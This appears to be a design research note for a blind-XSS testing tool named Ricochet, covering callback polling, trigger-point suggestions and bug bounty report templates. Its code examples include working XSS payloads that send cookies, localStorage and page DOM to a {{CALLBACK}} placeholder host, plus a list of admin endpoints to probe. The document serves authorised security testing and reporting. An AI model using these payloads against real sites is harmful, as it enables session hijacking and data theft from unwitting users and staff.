# Phase 8: Triggers & Reporting - Research

**Researched:** 2026-01-30
**Domain:** Blind XSS Detection, Callback Polling, Bug Bounty Reporting
**Confidence:** HIGH

## Summary

This research investigates the technical requirements for implementing passive/active trigger modes, XSS callback metadata capture, trigger point suggestions, and bug bounty report generation for Ricochet.

The core challenge is two-fold: (1) implementing effective polling strategies for detecting out-of-band callbacks that may arrive minutes, hours, or even days after injection, and (2) capturing comprehensive metadata when XSS payloads execute to demonstrate real impact in bug bounty reports.

Key findings indicate that XSSHunter-style metadata capture (DOM snapshot, cookies, URL, user-agent) is the industry standard, polling intervals of 5-10 seconds work well for active testing while longer intervals (30-60s) suit passive monitoring, and bug bounty reports require structured PoC steps with clear impact demonstration.

**Primary recommendation:** Implement a TriggerOrchestrator that coordinates injection, polling, and trigger suggestion based on injection context, with a ReportGenerator that produces markdown reports in HackerOne/Bugcrowd-compatible format.

## Standard Stack

The established libraries/tools for this domain:

### Core
| Library | Version | Purpose | Why Standard |
|---------|---------|---------|--------------|
| Python stdlib | 3.11+ | asyncio for polling loops | No dependencies, event-driven polling |
| urllib.request | stdlib | HTTP callbacks for XSS | Already used in codebase |
| json | stdlib | Metadata serialization | Already used in codebase |
| time | stdlib | Timestamp tracking | Already used in codebase |

### Supporting
| Library | Version | Purpose | When to Use |
|---------|---------|---------|-------------|
| Jinja2 | 3.1+ | Report template rendering | Optional - can use string formatting |
| markdown | 3.5+ | Report preview rendering | Optional - reports are markdown source |

### Alternatives Considered
| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| Jinja2 templates | f-strings | f-strings simpler but less maintainable for complex reports |
| async polling | threading | async cleaner for multiple poll sources, but threading already works in existing code |

**Installation:**
```bash
# No new dependencies required - use stdlib
# Optional for enhanced templates:
uv pip install jinja2
```

## Architecture Patterns

### Recommended Project Structure
```
ricochet/
├── triggers/
│   ├── __init__.py           # Module exports
│   ├── orchestrator.py       # TriggerOrchestrator class
│   ├── polling.py            # PollingStrategy implementations
│   ├── suggestions.py        # TriggerSuggester based on context
│   └── active.py             # ActiveTrigger endpoint catalog
├── reporting/
│   ├── __init__.py           # Module exports
│   ├── generator.py          # ReportGenerator class
│   ├── templates/            # Report template strings
│   │   ├── xss.py           # XSS report template
│   │   ├── sqli.py          # SQLi report template
│   │   └── ssti.py          # SSTI report template
│   └── metadata.py           # XSS callback metadata extraction
└── payloads/
    └── builtin/
        └── xss-exfil.txt     # XSS payloads with metadata capture JS
```

### Pattern 1: Polling Strategy Pattern
**What:** Configurable polling intervals with exponential backoff on quiet periods
**When to use:** Both passive and active modes need different polling behavior

```python
# Source: Research synthesis from Interactsh and polling best practices
from dataclasses import dataclass
from typing import Callable, Optional
import time

@dataclass
class PollingConfig:
    """Polling configuration for callback monitoring."""
    base_interval: float = 5.0      # Base poll interval in seconds
    max_interval: float = 60.0      # Maximum interval after backoff
    backoff_factor: float = 1.5     # Multiplier on quiet polls
    reset_on_callback: bool = True  # Reset interval when callback received
    timeout: float = 3600.0         # Total polling timeout (1 hour default)


class PollingStrategy:
    """Adaptive polling with exponential backoff."""

    def __init__(self, config: PollingConfig):
        self.config = config
        self.current_interval = config.base_interval
        self.polls_without_callback = 0
        self.start_time: Optional[float] = None

    def get_next_interval(self, received_callback: bool) -> float:
        """Calculate next polling interval based on callback activity."""
        if received_callback and self.config.reset_on_callback:
            self.current_interval = self.config.base_interval
            self.polls_without_callback = 0
        else:
            self.polls_without_callback += 1
            # Exponential backoff after consecutive quiet polls
            if self.polls_without_callback > 5:
                self.current_interval = min(
                    self.current_interval * self.config.backoff_factor,
                    self.config.max_interval
                )
        return self.current_interval

    def is_timed_out(self) -> bool:
        """Check if polling has exceeded timeout."""
        if self.start_time is None:
            self.start_time = time.time()
        return (time.time() - self.start_time) > self.config.timeout
```

### Pattern 2: Trigger Suggestion Engine
**What:** Context-aware suggestions for where injected payloads might execute
**When to use:** After injection to guide manual trigger exploration

```python
# Source: Research synthesis from blind XSS trigger point analysis
from dataclasses import dataclass
from typing import Literal

@dataclass
class TriggerSuggestion:
    """Suggested location where payload might execute."""
    location: str              # e.g., "Admin Dashboard", "Support Tickets"
    likelihood: Literal['high', 'medium', 'low']
    description: str           # Why this is likely
    manual_steps: list[str]    # Steps to trigger manually

# Mapping of injection contexts to likely trigger points
TRIGGER_MAP = {
    'query:name': [
        TriggerSuggestion(
            location="Admin User List",
            likelihood="high",
            description="User names often displayed in admin dashboards",
            manual_steps=[
                "Log into admin panel",
                "Navigate to User Management",
                "View user list or search for injected user"
            ]
        ),
        TriggerSuggestion(
            location="Activity Logs",
            likelihood="medium",
            description="User activity may be logged with name field",
            manual_steps=[
                "Access activity/audit log viewer",
                "Filter by recent activity",
                "Review entries containing injected data"
            ]
        ),
    ],
    'body:comment': [
        TriggerSuggestion(
            location="Content Moderation Queue",
            likelihood="high",
            description="Comments typically reviewed before publishing",
            manual_steps=[
                "Access moderation dashboard",
                "Review pending comments",
                "View comment detail page"
            ]
        ),
    ],
    'header:User-Agent': [
        TriggerSuggestion(
            location="Analytics Dashboard",
            likelihood="medium",
            description="User-Agent strings logged for analytics",
            manual_steps=[
                "Access analytics or reporting dashboard",
                "View visitor/session details",
                "Check raw request logs"
            ]
        ),
    ],
}
```

### Pattern 3: XSS Callback Metadata Capture
**What:** JavaScript payloads that exfiltrate comprehensive metadata when executed
**When to use:** All XSS callback payloads should capture metadata

```python
# Source: XSSHunter patterns, PayloadsAllTheThings
# JavaScript payload for metadata capture - embedded in XSS payloads

XSS_CALLBACK_JS = '''
(function(){
    var d=document,w=window,l=location;
    var data={
        url:l.href,
        dom:d.documentElement.outerHTML.substring(0,50000),
        cookies:d.cookie,
        localStorage:JSON.stringify(localStorage),
        userAgent:navigator.userAgent,
        referrer:d.referrer,
        origin:l.origin,
        title:d.title,
        timestamp:new Date().toISOString()
    };
    var img=new Image();
    img.src='{{CALLBACK}}?d='+encodeURIComponent(JSON.stringify(data));
})();
'''

# Compact version for tight injection contexts
XSS_CALLBACK_COMPACT = '''fetch('{{CALLBACK}}',{method:'POST',body:JSON.stringify({u:location.href,c:document.cookie,d:document.documentElement.innerHTML.slice(0,10000),a:navigator.userAgent})})'''
```

### Anti-Patterns to Avoid
- **Polling too aggressively:** 1-second intervals strain servers and trigger rate limits. Use 5+ seconds minimum.
- **Ignoring HttpOnly cookies:** Don't claim cookie theft when HttpOnly is set - check for this in reports.
- **Massive DOM captures:** Truncate DOM to 50KB max to avoid memory issues.
- **Hard-coded timeouts:** Allow user-configurable polling duration for different testing scenarios.

## Don't Hand-Roll

Problems that look simple but have existing solutions:

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| Unique IDs | Custom random string | secrets.token_hex(8) | Cryptographically secure, already in codebase |
| Report templates | String concatenation | f-strings with template constants | Maintainable, version-controlled templates |
| Polling loops | while True with sleep | PollingStrategy class | Handles backoff, timeout, cancellation |
| URL encoding | Manual escaping | urllib.parse.quote_plus | Handles all edge cases |

**Key insight:** The existing codebase already has InjectionStore.get_findings() which provides the correlation between injections and callbacks - the reporting system should consume this rather than reimplementing correlation.

## Common Pitfalls

### Pitfall 1: Missing HttpOnly Cookie Detection
**What goes wrong:** Reporting cookie theft when HttpOnly flag prevents JavaScript access
**Why it happens:** Tester doesn't verify which cookies are actually accessible
**How to avoid:** XSS callback JS should report empty cookie string honestly; report generator should note "HttpOnly cookies protected"
**Warning signs:** document.cookie returns empty string but session cookie exists

### Pitfall 2: DOM Snapshot Memory Explosion
**What goes wrong:** Capturing full DOM on complex pages causes 100MB+ data
**Why it happens:** No truncation on documentElement.outerHTML
**How to avoid:** Truncate to 50KB, capture only body if full DOM too large
**Warning signs:** Callback server OOM, slow response times

### Pitfall 3: Polling Without Timeout
**What goes wrong:** Passive mode runs forever consuming resources
**Why it happens:** No maximum duration configured
**How to avoid:** Default 1-hour timeout, require explicit --indefinite flag for longer
**Warning signs:** Process accumulating memory, forgotten terminal sessions

### Pitfall 4: Report Without Reproduction Steps
**What goes wrong:** Bug bounty triagers can't validate the finding
**Why it happens:** Focus on "I found XSS" without "here's how"
**How to avoid:** Require injection_url, payload, and callback_url in report
**Warning signs:** Reports rejected as "insufficient information"

### Pitfall 5: Assuming Immediate Callback
**What goes wrong:** Declaring "no vulnerability" after 30 seconds of polling
**Why it happens:** Second-order XSS may take hours/days to trigger
**How to avoid:** Default passive timeout of 1 hour, suggest manual trigger exploration
**Warning signs:** Callbacks arriving after test session ended

## Code Examples

Verified patterns from research:

### XSS Callback Payload with Full Metadata
```javascript
// Source: XSSHunter patterns, research synthesis
// Full metadata capture - use for comprehensive blind XSS testing
<svg/onload='(function(){var d=document,l=location;fetch("{{CALLBACK}}",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:l.href,cookies:d.cookie,dom:d.body.innerHTML.substring(0,50000),ua:navigator.userAgent,ref:d.referrer,ts:Date.now()})})})()'>
```

### Compact Cookie-Only Payload
```javascript
// Source: PayloadsAllTheThings
// Minimal payload for space-constrained contexts
<img src=x onerror='new Image().src="{{CALLBACK}}?c="+document.cookie'>
```

### Image-Based Exfiltration (No CORS)
```javascript
// Source: Research synthesis
// Works even when fetch blocked by CSP
<script>new Image().src='{{CALLBACK}}?d='+encodeURIComponent(JSON.stringify({u:location.href,c:document.cookie}))</script>
```

### Bug Bounty Report Template
```markdown
// Source: HackerOne/Bugcrowd best practices, ZephrFish/BugBountyTemplates
## Summary
[TYPE] vulnerability in [PARAMETER] at [URL]

## Severity
[HIGH/MEDIUM/LOW] - [CVSS if applicable]

## Description
A [stored/reflected/blind] XSS vulnerability exists in the [parameter] parameter
of the [endpoint] endpoint. When a malicious payload is submitted, it is stored
and later executed in the context of [admin panel/support dashboard/etc].

## Steps to Reproduce
1. Navigate to: `[INJECTION_URL]`
2. Enter the following payload in the [parameter] field:
   ```
   [PAYLOAD]
   ```
3. Submit the form
4. [If blind XSS] Wait for admin/support staff to view the submission
5. Observe callback received at: `[CALLBACK_URL]`

## Proof of Concept
- **Injection Point:** [URL with parameter highlighted]
- **Payload Used:** `[PAYLOAD]`
- **Callback Received:** [timestamp]
- **Captured Data:**
  - URL: [victim URL when XSS fired]
  - User-Agent: [victim browser]
  - Cookies: [redacted/none due to HttpOnly]
  - DOM Snippet: [relevant portion]

## Impact
An attacker can:
- Steal session cookies and hijack user accounts
- Perform actions on behalf of authenticated users
- Access sensitive data displayed on the page
- [Specific impact based on context]

## Remediation
- Implement proper output encoding (HTML entity encoding for HTML context)
- Use Content-Security-Policy headers to restrict inline script execution
- Set HttpOnly flag on sensitive cookies
- Implement input validation on the server side

## References
- OWASP XSS Prevention Cheat Sheet
- CWE-79: Improper Neutralization of Input During Web Page Generation
```

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| alert(1) PoC | Full data exfiltration | 2020+ | Bug bounties require demonstrated impact |
| Manual callback checking | Automated polling with Interactsh/XSSHunter | 2021+ | Continuous monitoring replaces manual refresh |
| Text-only reports | Markdown with screenshots | 2022+ | Triage teams expect structured reports |
| Cookie-only capture | DOM+localStorage+cookies | 2023+ | HttpOnly cookies mean other data matters more |

**Deprecated/outdated:**
- Simple `alert()` payloads: Bug bounty programs reject without impact demonstration
- Long polling intervals (>60s): Modern tooling expects 5-10s for interactive testing

## Open Questions

Things that couldn't be fully resolved:

1. **Screenshot Capture**
   - What we know: XSSHunter uses HTML5 canvas API for screenshots
   - What's unclear: How to implement pure-JS screenshot without external dependencies
   - Recommendation: Out of scope for Phase 8; DOM snapshot sufficient for MVP

2. **Rate Limiting on Polling**
   - What we know: Some callback servers rate-limit poll requests
   - What's unclear: Optimal backoff strategy for different servers
   - Recommendation: Start with 5s base, 1.5x backoff, cap at 60s

3. **Report Format Variations**
   - What we know: HackerOne and Bugcrowd have similar but not identical expectations
   - What's unclear: Whether to support multiple output formats
   - Recommendation: Single markdown format that works for both platforms

## Trigger Point Catalog

Based on research, these are the common second-order execution contexts:

### HIGH Likelihood
| Injection Location | Trigger Location | Notes |
|-------------------|------------------|-------|
| User registration (name) | Admin user list | Names displayed without encoding |
| Support ticket content | Support dashboard | Agents view raw ticket content |
| Comment/feedback | Moderation queue | Content reviewed before publishing |
| Error messages | Error logging dashboard | Stack traces often displayed raw |

### MEDIUM Likelihood
| Injection Location | Trigger Location | Notes |
|-------------------|------------------|-------|
| User-Agent header | Analytics dashboard | Logged for reporting |
| Referer header | Access logs viewer | Displayed in admin logs |
| Search queries | Search analytics | Query strings logged |
| Order notes | Order management | Internal notes displayed |

### LOW Likelihood (but high impact)
| Injection Location | Trigger Location | Notes |
|-------------------|------------------|-------|
| Email subject/body | Email client preview | Webmail renders HTML |
| Export filename | CSV/PDF export | Filename in download |
| API response | Internal monitoring | Response bodies logged |

## Active Trigger Endpoints

Common endpoints to probe for second-order execution:

```python
# Source: Research synthesis from blind XSS trigger point analysis
ACTIVE_TRIGGER_ENDPOINTS = [
    # Admin/Management
    "/admin",
    "/admin/users",
    "/admin/logs",
    "/admin/reports",
    "/dashboard",
    "/manage",

    # Support/Helpdesk
    "/support",
    "/tickets",
    "/helpdesk",

    # Reporting/Analytics
    "/analytics",
    "/reports",
    "/stats",
    "/logs",

    # Content Management
    "/moderation",
    "/content",
    "/posts",
    "/comments",

    # Export Functions (trigger PDF/CSV generation)
    "/export",
    "/download",
    "/pdf",
    "/report/generate",
]
```

## Sources

### Primary (HIGH confidence)
- [XSSHunter GitHub](https://github.com/mandatoryprogrammer/xsshunter) - Metadata capture patterns
- [Interactsh GitHub](https://github.com/projectdiscovery/interactsh) - Polling interval defaults (5s)
- [HackerOne Report Templates](https://docs.hackerone.com/en/articles/8496338-report-templates) - Report structure
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) - Exfiltration payloads

### Secondary (MEDIUM confidence)
- [Bugcrowd Blind XSS Guide](https://www.bugcrowd.com/blog/the-guide-to-blind-xss-advanced-techniques-for-bug-bounty-hunters-worth-250000/) - Trigger points and techniques
- [ZephrFish/BugBountyTemplates](https://github.com/ZephrFish/BugBountyTemplates) - Report formatting
- [OWASP XSS Prevention](https://owasp.org/www-community/attacks/xss/) - Vulnerability categories

### Tertiary (LOW confidence)
- WebSearch results for polling best practices - General patterns, not security-specific
- Medium articles on blind XSS - Community practices, validate with testing

## Metadata

**Confidence breakdown:**
- Standard stack: HIGH - stdlib only, no new dependencies
- Architecture: HIGH - Patterns derived from XSSHunter and Interactsh
- Polling strategy: MEDIUM - Best practices from general polling research applied to security context
- Trigger suggestions: MEDIUM - Derived from multiple bug bounty write-ups
- Report format: HIGH - Based on official HackerOne/Bugcrowd documentation

**Research date:** 2026-01-30
**Valid until:** 2026-03-01 (30 days - stable patterns, slow-moving domain)
